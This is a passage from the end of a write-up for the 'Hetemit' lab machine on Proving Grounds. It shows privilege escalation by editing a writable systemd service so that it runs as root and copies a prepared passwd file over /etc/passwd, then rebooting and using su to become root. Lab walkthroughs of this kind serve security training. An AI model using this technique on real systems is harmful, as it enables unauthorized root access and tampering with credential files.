tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
polkitd:x:998:996:User for polkitd:/:/sbin/nologin
libstoragemgmt:x:997:995:daemon account for libstoragemgmt:/var/run/lsm:/sbin/nologin
cockpit-ws:x:996:993:User for cockpit web service:/nonexisting:/sbin/nologin
cockpit-wsinstance:x:995:992:User for cockpit-ws instances:/nonexisting:/sbin/nologin
sssd:x:994:990:User for sssd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
chrony:x:993:989::/var/lib/chrony:/sbin/nologin
rngd:x:992:988:Random Number Generator Daemon:/var/lib/rngd:/sbin/nologin
cmeeks:x:1000:1000::/home/cmeeks:/bin/bash
unbound:x:991:987:Unbound DNS resolver:/etc/unbound:/sbin/nologin
postgres:x:26:26:PostgreSQL Server:/var/lib/pgsql:/bin/bash
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
```

Now let us modify the `pythonapp.service` file.

```
[cmeeks@hetemit ~]$ cat /etc/systemd/system/pythonapp.service 
[Unit]
Description=Python App
After=network-online.target

[Service]
Type=simple
WorkingDirectory=/home/cmeeks/restjson_hetemit
ExecStart=cp /home/cmeeks/passwd.bak /etc/passwd
TimeoutSec=30
RestartSec=15s
User=root
ExecReload=/bin/kill -USR1 $MAINPID
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

Take a special look at `User` and `ExecStart` parameters.

Now we just need to reboot the system, so that the `pythonapp.service` will restart.

```
[cmeeks@hetemit ~]$ sudo reboot -r now
Connection to 192.168.131.117 closed by remote host.
Connection to 192.168.131.117 closed.
```

Again, let us SSH into the box.

```
┌──(root💀nehal)-[~]
└─# ssh -i id_rsa cmeeks@192.168.131.117                                                                                                                                             
Activate the web console with: systemctl enable --now cockpit.socket

Last login: Mon May 31 18:56:55 2021 from 192.168.49.131
[cmeeks@hetemit ~]$ 
```

Now, we just switch over to `root` with the password we created.

```
[cmeeks@hetemit ~]$ su - root
Password: 
[root@hetemit ~]# id && whoami; date
uid=0(root) gid=0(root) groups=0(root)
root
Mon May 31 18:58:32 UTC 2021
```

And we are `root`. Now you can read the root flag too.

![](assets/img/hetemit-pg/meme3.gif)

So that was **Hetemit** from **Proving Grounds**.

**Thanks** for reading this far. Hope you liked it.

I will see you in the next writeup. **Peace**.